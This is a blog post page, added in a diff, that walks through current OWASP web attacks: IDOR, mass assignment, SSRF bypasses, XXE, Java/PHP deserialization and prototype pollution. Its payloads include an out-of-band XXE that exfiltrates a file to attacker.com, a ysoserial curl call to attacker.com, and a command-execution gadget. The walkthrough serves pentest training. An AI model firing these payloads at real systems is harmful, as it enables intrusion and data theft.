@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="view-transition" content="same-origin">
+  <title>Web Application Hacking — The Modern OWASP Top 10 in Practice — Axiom</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <script src="/axiom-blog-site/static/js/theme.js?v=1"></script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap">
+  <link rel="stylesheet" href="/axiom-blog-site/static/css/style.css?v=37">
+  <link rel="stylesheet" href="/axiom-blog-site/cats.css">
+  <link rel="stylesheet" href="/axiom-blog-site/static/css/hljs.min.css?v=2">
+  <link rel="alternate" type="application/atom+xml" title="Axiom" href="/axiom-blog-site/feed.xml">
+  
+  
+  <script type="application/json" id="crypto-config">{"iterations": 200000, "salt": "Hs5vGSmGG9SrSvdivb1KMQ==", "validator": {"ciphertext": "qc5l/aTsWWRNo4f5E4/mEvP5on0aI+iozmsqvajrAwNS", "iv": "HdtYEOAFH1dyaFcb"}}</script>
+
+</head>
+<body class="cat-context-security">
+  <header class="site-header">
+    <div class="container">
+      <a href="/axiom-blog-site/" class="site-brand">
+        <span class="brand-name">Axiom</span>
+      </a>
+      <nav class="site-nav">
+        
+  <a href="/axiom-blog-site/" class="nav-back">
+    <svg width="14" height="14" viewBox="0 0 16 16" fill="currentColor">
+      <path fill-rule="evenodd" d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z"/>
+    </svg>
+    All posts
+  </a>
+
+        <button class="search-trigger" id="themeToggle" aria-label="Toggle theme" title="Toggle theme">
+          <svg class="icon-sun" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="4"/>
+            <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/>
+          </svg>
+          <svg class="icon-moon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
+          </svg>
+        </button>
+        <button class="search-trigger" id="searchTrigger" aria-label="Search posts" title="Search">
+          <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+          </svg>
+        </button>
+      </nav>
+    </div>
+  </header>
+
+  
+  <div class="search-overlay" id="searchOverlay" aria-hidden="true" role="dialog" aria-modal="true" aria-label="Search">
+    <div class="search-backdrop" id="searchBackdrop"></div>
+    <div class="search-panel">
+      <div class="search-input-wrap">
+        <svg class="search-icon-inner" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+        </svg>
+        <input class="search-input" id="searchInput"
+               type="search"
+               placeholder="Search titles, tags, content…"
+               autocomplete="off"
+               spellcheck="false"
+               maxlength="100"
+               aria-label="Search posts">
+        <button class="search-close" id="searchClose" aria-label="Close search">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round">
+            <path d="M18 6 6 18M6 6l12 12"/>
+          </svg>
+        </button>
+      </div>
+      <div class="search-results" id="searchResults" role="listbox" aria-live="polite"></div>
+    </div>
+  </div>
+
+  
+  <div class="modal-backdrop" id="shortcutsModalBackdrop" hidden>
+    <div class="modal" id="shortcutsModal" role="dialog" aria-modal="true" aria-labelledby="shortcutsTitle">
+      <div class="modal-header">
+        <div class="modal-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+            <rect x="2" y="6" width="20" height="12" rx="2"/>
+            <path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M6 14h12"/>
+          </svg>
+        </div>
+        <div>
+          <h2 class="modal-title" id="shortcutsTitle">Keyboard Shortcuts</h2>
+          <p class="modal-subtitle">Navigate this site faster.</p>
+        </div>
+      </div>
+      <div class="modal-body">
+        <div class="shortcuts-list">
+          <div class="shortcuts-row">
+            <span>Open search</span>
+            <span class="shortcuts-keys"><span class="key">/</span><span class="key">s</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Close dialog</span>
+            <span class="shortcuts-keys"><span class="key">Esc</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Go home</span>
+            <span class="shortcuts-keys"><span class="key">g</span><span class="key">h</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Show this help</span>
+            <span class="shortcuts-keys"><span class="key">?</span></span>
+          </div>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-ghost" id="shortcutsClose">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <main class="site-main">
+    <div class="container">
+      
+
+<div id="readingProgress" hidden></div>
+
+<article class="post-article has-toc cat-context-security">
+
+  <div class="post-main">
+
+  <header class="post-header">
+    <h1 class="post-title">Web Application Hacking — The Modern OWASP Top 10 in Practice</h1>
+    <div class="post-meta">
+      <time>2026-06-17</time>
+      
+        <span class="meta-sep">·</span>
+        <span class="reading-time">2 min read</span>
+      
+      
+        <span class="meta-sep">·</span>
+        <a href="/axiom-blog-site/cat/security/" class="cat-badge cat-badge-link cat-security">Security</a>
+      
+      
+        <span class="meta-sep">·</span>
+        <span class="tag-list">
+          
+            <span class="tag">web</span>
+          
+            <span class="tag">owasp</span>
+          
+            <span class="tag">idor</span>
+          
+            <span class="tag">ssrf</span>
+          
+            <span class="tag">deserialization</span>
+          
+            <span class="tag">prototype-pollution</span>
+          
+        </span>
+      
+    </div>
+    
+      <p class="post-summary">A practical attack walkthrough of current OWASP vulnerability classes with real payloads — IDOR, broken access control, SSRF, XXE, insecure deserialization, and prototype pollution — focused on finding them in modern frameworks where the textbook payload doesn&#39;t fire.</p>
+    
+  </header>
+
+  
+  
+
+
+  <div class="post-body">
+    
+
+      
+        <div class="block text-block"><p>Textbook payloads against a deliberately vulnerable training app teach the concept but not the job. Modern frameworks add layers — ORMs, schema validation, auto-escaping templates — that block the naive version of every classic attack. This walkthrough focuses on the adjustment each one needs to actually fire against a real, modern stack.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            
+            <span class="heading-text">Broken Access Control / IDOR</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Modern APIs increasingly use UUIDs instead of sequential integer IDs specifically to defeat naive IDOR enumeration. That doesn't fix the underlying access-control gap — it just means you need a UUID belonging to another user before you can test the check, which you can usually get from a response that leaks one (a "recently viewed" list, an admin-facing endpoint, a webhook payload) rather than guessing it.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">http</span>
+            <span class="code-caption">UUID-based IDOR — the check is missing, not the obfuscation</span>
+          </div>
+          <pre><code class="language-http">GET /api/orders/3f29a1c4-8e1b-4d2a-9c77-1a9b6e4f0d21 HTTP/1.1
+Authorization: Bearer &lt;your_own_low_priv_token&gt;
+Host: shop.example.com
+
+# If this returns another user&#39;s order data using YOUR token,
+# the UUID was never the control -- the missing ownership check was</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Also test the inverse direction modern apps frequently miss: <strong>mass assignment via PATCH/PUT bodies</strong>. A user-editable profile endpoint that blindly binds the request body to a model can let you set fields the UI never exposes — <code>role</code>, <code>isAdmin</code>, <code>accountTier</code> — if the framework's serializer doesn't explicitly allowlist bindable fields.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">http</span>
+            <span class="code-caption">Mass assignment probe</span>
+          </div>
+          <pre><code class="language-http">PATCH /api/users/me HTTP/1.1
+Authorization: Bearer &lt;your_token&gt;
+Content-Type: application/json
+
+{&#34;name&#34;: &#34;Test User&#34;, &#34;role&#34;: &#34;admin&#34;, &#34;isAdmin&#34;: true}</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            
+            <span class="heading-text">SSRF — Past the Naive Filter</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Most modern apps that accept a URL parameter (webhook configuration, "import from URL", PDF/screenshot generation) now run a basic blocklist against <code>localhost</code>, <code>127.0.0.1</code>, and <code>169.254.169.254</code>. None of the bypasses below are new techniques — they're the standard responses to that exact blocklist, and they still work because the blocklist is checking the string, not the resolved destination.</p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Bypass</th><th>Example</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>Decimal/octal IP encoding</td><td>http://2130706433/ (decimal for 127.0.0.1)</td>
+                </tr>
+              
+                <tr>
+                  <td>DNS rebinding to a domain you control</td><td>http://attacker-controlled-resolves-to-169.254.169.254.example.com/</td>
+                </tr>
+              
+                <tr>
+                  <td>Open redirect chaining through an allowed domain</td><td>http://trusted-cdn.com/redirect?to=http://169.254.169.254/</td>
+                </tr>
+              
+                <tr>
+                  <td>IPv6 loopback / mapped forms</td><td>http://[::1]/ or http://[::ffff:127.0.0.1]/</td>
+                </tr>
+              
+                <tr>
+                  <td>URL parser inconsistency (`@` confusion)</td><td>http://expected-allowed-host.com@169.254.169.254/</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-note-block note-tip">
+          
+            <div class="note-label">
+              
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18h6"/><path d="M10 22h4"/><path d="M15.09 14c.18-.98.65-1.74 1.41-2.5A4.65 4.65 0 0 0 18 8 6 6 0 0 0 6 8c0 1 .23 2.23 1.5 3.5.46.45.97 1.36 1.41 2.5"/></svg>
+              
+              <span>Always test the response-time delta</span>
+            </div>
+          
+          <div class="note-body"><p>Even when the response body is filtered or generic, a blind SSRF candidate that takes measurably longer to respond when pointed at an internal-only address (versus a clearly external one) confirms the request is actually being made server-side — useful for proving impact even without a full response leak.</p></div>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            
+            <span class="heading-text">XXE — When the Parser Looks Hardened</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Most current XML libraries disable external entity resolution by default, which kills the textbook <code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;</code> payload outright. Two angles still work against a "hardened by default" parser: finding a secondary XML-consuming code path that uses an older library version or an explicit insecure configuration (SVG upload handlers and SAML assertion parsers are repeat offenders), and <strong>error-based out-of-band exfiltration</strong> when in-band entity expansion is blocked but DTD parsing itself isn't fully disabled.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">xml</span>
+            <span class="code-caption">Out-of-band XXE via an external DTD (works against some &#34;hardened&#34; configs)</span>
+          </div>
+          <pre><code class="language-xml">&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE foo SYSTEM &#34;http://attacker.com/evil.dtd&#34;&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+
+&lt;!-- evil.dtd, hosted on attacker.com: --&gt;
+&lt;!ENTITY % file SYSTEM &#34;file:///etc/hostname&#34;&gt;
+&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;http://attacker.com/?d=%file;&#39;&gt;&#34;&gt;
+%eval;
+%exfil;</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            
+            <span class="heading-text">Insecure Deserialization — Beyond `pickle.loads`</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>The naive version of this finding is "the app calls <code>pickle.loads</code> on user input" — rare in production code anyone reviewed. The version that actually shows up: a framework's session mechanism, a caching layer, or a message queue payload silently round-trips a serialized object through the client, and a gadget chain in an already-loaded library (not anything the developers wrote) provides the RCE primitive.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">Identifying and weaponising a Java deserialization sink</span>
+          </div>
+          <pre><code class="language-bash"># Decode a suspicious cookie/parameter — Java serialized objects start with this byte pattern
+echo &#39;&lt;base64_blob&gt;&#39; | base64 -d | xxd | head -1
+# ac ed 00 05 -- confirmed Java serialization magic bytes
+
+# Generate a gadget chain matching a library already on the classpath
+java -jar ysoserial.jar CommonsCollections6 &#39;curl http://attacker.com/pwned&#39; &gt; payload.bin
+
+# PHP equivalent -- generate against a known vulnerable class in the app&#39;s dependencies
+phpggc Laravel/RCE13 system &#39;id&#39; -b</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-note-block note-tip">
+          
+            <div class="note-label">
+              
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18h6"/><path d="M10 22h4"/><path d="M15.09 14c.18-.98.65-1.74 1.41-2.5A4.65 4.65 0 0 0 18 8 6 6 0 0 0 6 8c0 1 .23 2.23 1.5 3.5.46.45.97 1.36 1.41 2.5"/></svg>
+              
+              <span>Find the sink before reaching for a gadget chain</span>
+            </div>
+          
+          <div class="note-body"><p>Spend the time identifying <em>which</em> serialization library and <em>which</em> loaded classes are actually on the target's classpath before generating a gadget chain blind — <code>ysoserial</code>/<code>phpggc</code> both support dozens of chains, and firing the wrong one produces a silent failure indistinguishable from "not vulnerable" rather than useful signal.</p></div>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            
+            <span class="heading-text">Prototype Pollution — The Node.js-Specific One</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Prototype pollution is the modern-framework-specific entry on this list: a JavaScript object merge/clone utility (a vulnerable version of <code>lodash.merge</code>, a hand-rolled deep-merge for config objects, or a query-string parser that builds nested objects from bracket notation) lets an attacker set <code>__proto__</code> properties on the base <code>Object.prototype</code>, which then propagate into <em>every object in the application</em> that doesn't explicitly own that property — turning a seemingly cosmetic config-merge bug into application-wide logic corruption or, in the right gadget, RCE.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">http</span>
+            <span class="code-caption">Probing for prototype pollution via query-string bracket notation</span>
+          </div>
+          <pre><code class="language-http">GET /api/search?__proto__[isAdmin]=true&amp;q=test HTTP/1.1
+Host: app.example.com
+
+# If a subsequent, unrelated request from the same session now
+# behaves as if isAdmin were true anywhere object defaults are read
+# without an explicit own-property check, the pollution succeeded</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">javascript</span>
+            <span class="code-caption">The escalation: polluting a property a templating/exec gadget reads</span>
+          </div>
+          <pre><code class="language-javascript">// If the app uses a template engine vulnerable to a known
+// prototype-pollution-to-RCE gadget (several exist for older
+// ejs/pug/handlebars versions chained with a vulnerable merge):
+{
+  &#34;__proto__&#34;: {
+    &#34;outputFunctionName&#34;: &#34;x;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;);x&#34;
+  }
+}</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-note-block note-danger">
+          
+            <div class="note-label">
+              
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 22a1 1 0 0 0 1-1v-1a2 2 0 0 0 1.56-3.25 8 8 0 1 0-11.12 0A2 2 0 0 0 8 20v1a1 1 0 0 0 1 1z"/><circle cx="15" cy="12" r="1"/><circle cx="9" cy="12" r="1"/></svg>
+              
+              <span>The thread connecting all six</span>
+            </div>
+          
+          <div class="note-body"><p>Every one of these still works against a "modern, hardened" stack for the same underlying reason: <strong>the framework's default protection covers the textbook case, not the actual data flow your specific application built on top of it.</strong> UUIDs stop ID guessing, not missing ownership checks. Default XML parser settings stop the common payload, not a secondary code path on an older library. Finding the gap between what the framework defends and what the application actually does with user input is the entire skill — payloads are the easy part once you've found that gap.</p></div>
+        </div>
+
+      
+    
+  </div>
+
+  
+  
+
+
+  </div>
+
+  <nav id="tocBar" class="toc-bar" hidden></nav>
+
+</article>
+
+<button id="backToTop" hidden aria-label="Back to top">
+  <svg class="bt-ring" width="40" height="40" viewBox="0 0 40 40" aria-hidden="true">
+    <circle class="bt-ring-bg" cx="20" cy="20" r="17" fill="none" stroke-width="2"/>
+    <circle class="bt-ring-fg" cx="20" cy="20" r="17" fill="none" stroke-width="2"
+            stroke-dasharray="106.8" stroke-dashoffset="106.8"/>
+  </svg>
+  <svg class="bt-arrow" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="M12 19V5M5 12l7-7 7 7"/>
+  </svg>
+</button>
+
+
+
+
+<section class="related-posts">
+  <div class="section-header">
+    <span class="section-label">// related</span>
+    <span class="section-line"></span>
+  </div>
+  <div class="related-grid">
+    
+      
+      <a href="/axiom-blog-site/post/cloud-pentesting-aws-azure-gcp" class="post-card post-card-related card-cat-security">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-security">Security</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">Cloud Pentesting — Attacking AWS, Azure, and GCP from Zero Foothold</h2>
+          <div class="post-card-meta"><time>2026-06-17</time></div>
+          <p class="post-card-summary">A methodology for assessing cloud environments from nothing: IAM enumeration, SSRF-to-metadata-service, role chaining, privilege escalation via misconfigured policies, and where AWS, Azure, and GCP&#39;s attack surfaces genuinely diverge.</p>
+        </div>
+      </a>
+    
+      
+      <a href="/axiom-blog-site/post/sql-sqlmap-guide" class="post-card post-card-related card-cat-tools">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-tools">Tools</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">SQL Injection &amp; sqlmap – From Manual Payloads to Full Dumps</h2>
+          <div class="post-card-meta"><time>2026-06-03</time></div>
+          <p class="post-card-summary">SQL injection is one of the most impactful web vulnerabilities. Learn manual detection and exploitation techniques, then automate the heavy lifting with sqlmap — from basic dumps to OS shell access.</p>
+        </div>
+      </a>
+    
+      
+      <a href="/axiom-blog-site/post/lfi-local-file-inclusion" class="post-card post-card-related card-cat-notes">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-notes">Notes</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">LFI — Local File Inclusion from First Principles</h2>
+          <div class="post-card-meta"><time>2026-06-04</time></div>
+          <p class="post-card-summary">How local file inclusion works, every PHP wrapper, log poisoning, /proc tricks, path traversal filters, LFI-to-RCE paths, sensitive files on Linux and Windows, and a full exploitation methodology.</p>
+        </div>
+      </a>
+    
+  </div>
+</section>
+
+
+
+
+    </div>
+  </main>
+
+  <nav class="mobile-bottom-nav">
+    <a href="/axiom-blog-site/" aria-label="Home">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/>
+      </svg>
+      <span>Home</span>
+    </a>
+    <button type="button" id="mobileBottomSearch" aria-label="Search">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+      </svg>
+      <span>Search</span>
+    </button>
+    <a href="/axiom-blog-site/#categories" aria-label="Categories">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/>
+      </svg>
+      <span>Categories</span>
+    </a>
+  </nav>
+
+  <footer class="site-footer">
+    <div class="container">
+      <div class="footer-left">
+        <a href="/axiom-blog-site/" class="footer-brand">Axiom</a>
+      </div>
+      <nav class="footer-nav">
+        <a href="/axiom-blog-site/about" class="footer-link">About</a>
+        <a href="/axiom-blog-site/tags" class="footer-link">Tags</a>
+        <a href="/axiom-blog-site/privacy" class="footer-link">Privacy</a>
+        <a href="/axiom-blog-site/feed.xml" class="footer-link">RSS</a>
+      </nav>
+    </div>
+  </footer>
+
+  <script src="/axiom-blog-site/static/js/highlight.min.js?v=2"></script>
+  <script src="/axiom-blog-site/static/js/hljs-powershell.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-x86asm.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dos.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-http.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nginx.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-apache.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dockerfile.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-armasm.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-awk.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-cmake.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-coffeescript.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dart.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-elixir.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-erlang.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-fortran.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-fsharp.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-gradle.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-groovy.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-haskell.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-kotlin.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-latex.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-lisp.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nim.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nix.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-ocaml.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-pgsql.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-protobuf.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-scala.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-vim.min.js"></script>
+  <script src="/axiom-blog-site/static/js/search.js?v=1"></script>
+  <script src="/axiom-blog-site/static/js/animations.js?v=3"></script>
+  
+  <script src="/axiom-blog-site/static/js/crypto.js?v=2"></script>
+  <script src="/axiom-blog-site/static/js/app.js?v=3"></script>
+  <script src="/axiom-blog-site/static/js/toc.js?v=7"></script>
+  <script src="/axiom-blog-site/static/js/post.js?v=4"></script>
+
+</body>
+</html>
